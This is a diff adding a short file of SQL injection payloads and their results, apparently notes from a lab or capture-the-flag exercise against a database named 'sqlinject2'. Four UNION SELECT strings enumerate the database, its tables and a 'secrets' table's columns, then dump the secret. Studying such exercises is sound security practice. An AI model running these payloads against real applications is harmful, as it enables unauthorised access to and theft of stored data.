@@ -1,0 +1,8 @@
+0' UNION select DATABASE(), VERSION(), 1 -- 
+0' UNION SELECT GROUP_CONCAT(table_name), 'x', 1 FROM information_schema.tables WHERE table_schema = DATABASE()-- 
+0' UNION SELECT GROUP_CONCAT(column_name), 'x', 1 FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'secrets' -- 
+0' UNION SELECT GROUP_CONCAT(secret), 'x', 1 FROM secrets -- 
+Name: sqlinject2
+Version:8.0.41-0ubuntu0.22.04.1
+Tables: accounts,secrets
+Secret: SpicyTuna42
